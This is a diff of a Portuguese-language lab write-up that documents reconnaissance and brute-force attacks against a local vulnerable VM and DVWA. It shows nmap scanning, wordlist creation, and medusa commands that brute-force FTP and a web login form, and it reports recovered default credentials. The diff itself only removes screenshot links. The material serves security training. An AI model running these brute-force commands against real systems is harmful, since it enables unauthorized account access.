@@ -26,8 +26,6 @@ nmap -sV -p 21,22,80,445,139 192.168.56.101
 ```
 *Resultado:* Identificado o serviço `vsftpd 2.3.4` rodando na porta 21 (FTP), além dos serviços SSH e HTTP. Foi confirmado o acesso anônimo/tela de login via FTP.
 
-![Nmap Portscan Results](images/nmap-recon-portscan.png)
-
 ### 2. Geração das Wordlists
 Para otimizar o ataque, foram criadas duas wordlists customizadas diretamente via terminal com senhas e usuários padrão da indústria:
 ```bash
@@ -35,7 +33,6 @@ echo -e "user\nmsfadmin\nadmin\nroot" > User.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > Pass.txt
 ```
 
-![Echo Commands to Create Wordlists](images/prepare-wordlists-kali.png)
 
 ### 3. Cenário A: Força Bruta em Serviço FTP
 O protocolo FTP (Porta 21) frequentemente sofre com ataques de dicionário devido à falta de mecanismos de bloqueio padrão em sistemas legados. Utilizando o Medusa, o ataque foi paralelizado com 6 threads (`-t 6`):
@@ -44,7 +41,6 @@ medusa -h 192.168.56.101 -U User.txt -P Pass.txt -M ftp -t 6
 ```
 **Resultado:** Sucesso. O Medusa validou as credenciais `msfadmin:msfadmin` na porta 21, demonstrando a fragilidade das configurações de fábrica.
 
-![Medusa FTP Attack Success](images/medusa-ftp-attack-success.png)
 
 ### 4. Cenário B: Força Bruta em Formulário Web (DVWA)
 Visando explorar falhas de autenticação em aplicações web, o teste foi direcionado para a página de login do Damn Vulnerable Web Application (DVWA) rodando no IP do laboratório:
@@ -55,8 +51,6 @@ medusa -h 192.168.56.101 -U User.txt -P Pass.txt -M http \
 -m 'FAIL=Login failed' -t 6
 ```
 **Resultado:** Sucesso. Credenciais válidas interceptadas por meio de requisições HTTP POST automatizadas, contornando a tela de login.
-
-![Medusa HTTP Form Success](images/dvwa-web-login-success.png)
 
 ---
 
